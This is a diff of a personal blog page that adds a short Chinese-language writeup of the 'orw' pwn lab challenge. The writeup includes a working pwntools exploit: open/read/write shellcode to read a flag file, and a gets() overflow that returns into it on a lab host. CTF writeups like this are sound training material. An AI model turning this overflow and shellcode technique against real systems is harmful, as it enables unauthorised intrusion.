@@ -18,18 +18,24 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="kazma&#39;s personal space to dive deep into programming, cybersecurity challenges, CTF experiences, and insights from NCKU. Join me on my journey through the digital realm.">
+        <meta name="description" content="orworw 顧名思義就是開放 open，read and write 三個 syscalls 的經典題目。如下圖：  執行看一下：  r2 看一下 main：  一開始他會先把輸入讀到全域變數 obj.sc，然後他開了 0x10 的 buffer，但是用 gets 讀。計畫就是用 orw 開 shell，然後 ret2sc，至於 obj.sc 的位置 r2 上面就有很貼心地標在 obj.sc 上">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Yuawn Pwn1 orw Writeup">
 <meta property="og:url" content="https://kazma.tw/2023/12/10/Yuawn-Pwn1-orw-Writeup/index.html">
 <meta property="og:site_name" content="kazma&#39;s blog">
-<meta property="og:description" content="kazma&#39;s personal space to dive deep into programming, cybersecurity challenges, CTF experiences, and insights from NCKU. Join me on my journey through the digital realm.">
+<meta property="og:description" content="orworw 顧名思義就是開放 open，read and write 三個 syscalls 的經典題目。如下圖：  執行看一下：  r2 看一下 main：  一開始他會先把輸入讀到全域變數 obj.sc，然後他開了 0x10 的 buffer，但是用 gets 讀。計畫就是用 orw 開 shell，然後 ret2sc，至於 obj.sc 的位置 r2 上面就有很貼心地標在 obj.sc 上">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://kazma.tw/images/seccomp.png">
+<meta property="og:image" content="https://kazma.tw/images/orw_preview.png">
+<meta property="og:image" content="https://kazma.tw/images/r2_orw.png">
 <meta property="article:published_time" content="2023-12-10T13:24:37.000Z">
-<meta property="article:modified_time" content="2023-12-10T13:24:37.656Z">
+<meta property="article:modified_time" content="2023-12-12T17:22:26.629Z">
 <meta property="article:author" content="kazma">
-<meta property="article:tag" content="kazma, blog, ctf, reverse, engineering, pwn, binary, ncku, life, programming, coding, cybersecurity">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="lab">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kazma.tw/images/seccomp.png">
     
     
     <!--- Icon Part-->
@@ -406,13 +412,32 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2023-12-10 21:24:37</span>
-            <span class="mobile">2023-12-10 21:24:37</span>
+            <span class="desktop">2023-12-13 01:22:26</span>
+            <span class="mobile">2023-12-13 01:22:26</span>
             <span class="hover-info">Updated</span>
         </span>
     
 
     
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/writeup/">writeup</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/lab/">lab</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/pwn/">pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
     
 
     
@@ -434,7 +459,31 @@
 
 
         <div class="article-content markdown-body">
-            
+            <h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><p>orw 顧名思義就是開放 open，read and write 三個 syscalls 的經典題目。如下圖：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/seccomp.png"
+                      alt="seccomp"
+                ></p>
+<p>執行看一下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/orw_preview.png"
+                      alt="preview"
+                ></p>
+<p>r2 看一下 main：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/r2_orw.png"
+                      alt="r2_or2"
+                ></p>
+<p>一開始他會先把輸入讀到全域變數 obj.sc，然後他開了 0x10 的 buffer，但是用 gets 讀。<br>計畫就是用 orw 開 shell，然後 ret2sc，至於 obj.sc 的位置 r2 上面就有很貼心地標在 obj.sc 上面。<br>exploit：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;10.129.0.57&#x27;</span>, <span class="number">10171</span>)</span><br><span class="line"></span><br><span class="line">sc = asm(</span><br><span class="line">        shellcraft.pushstr(<span class="string">b&quot;/home/orw/flag&quot;</span>) +</span><br><span class="line">        shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;rsp&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>) +</span><br><span class="line">        shellcraft.read(<span class="string">&#x27;rax&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x30</span>) +</span><br><span class="line">        shellcraft.write(<span class="number">1</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x30</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;&gt;&#x27;</span>, sc)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:)&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0x6010a0</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+
         </div>
 
         
@@ -448,7 +497,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2023-12-10 21:24:37
+                    :</strong> 2023-12-13 01:22:26
             </li>
         
         <li>
@@ -469,6 +518,22 @@
             </div>
         
 
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/writeup/">#writeup</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/lab/">#lab</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/pwn/">#pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
         
 
         
@@ -577,7 +642,7 @@
     <div class="post-toc">
         <div class="toc-title">On this page</div>
         <div class="page-title">Yuawn Pwn1 orw Writeup</div>
-        
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#orw"><span class="nav-text">orw</span></a></li></ol>
 
     </div>
 </div>
